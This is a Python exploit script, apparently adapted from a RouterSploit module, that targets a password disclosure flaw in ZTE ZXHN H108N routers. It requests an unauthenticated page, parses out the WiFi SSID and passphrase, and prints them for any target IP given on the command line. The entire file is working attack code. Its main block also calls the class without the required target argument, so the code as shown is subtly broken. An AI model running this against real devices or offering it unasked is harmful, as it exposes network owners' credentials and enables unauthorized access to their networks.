target = ""
# rsf exploit module
# description: Module exploits ZTE ZXHN H108N WiFi Password Disclosure vulnerability that allows retrieving password for WiFi connection.

import re
import requests

class Exploit:
    __info__ = {
        "name": "ZTE ZXHN H108N Wifi Password Disclosure",
        "description": "Module exploits ZTE ZXHN H108N WiFi Password Disclosure vulnerability that allows retrieving password for WiFi connection.",
        "authors": (
            "Mostafa Nafady",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://github.com/threat9/routersploit/issues/588",
        ),
        "devices": (
            "ZTE ZXHN H108N",
        ),
    }

    def __init__(self, target, port=80):
        self.target = target
        self.port = port

    def run(self):
        credentials = self.get_credentials()
        if credentials:
            print("Target is vulnerable")
            ssid, password = credentials
            creds = [
                ("SSID Name", ssid),
                ("Password", password)
            ]
            for item in creds:
                print(f"{item[0]}: {item[1]}")
        else:
            print("Exploit failed - target seems to be not vulnerable")

    def get_credentials(self):
        response = requests.get(f"http://{self.target}:{self.port}/wizard_wlan_t.gch")
        if response:
            ssid = ""
            password = ""
            ssid_res = re.findall(r"Transfer_meaning\('ESSID','(.*?)'\);", response.text)
            if ssid_res:
                ssid = ssid_res[0]
            password_res = re.findall(r"Transfer_meaning\('KeyPassphrase','(.*?)'\);", response.text)
            if password_res:
                password = password_res[0]
            if ssid or password:
                return (ssid, password)
        return None

    def check(self):
        return bool(self.get_credentials())




import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
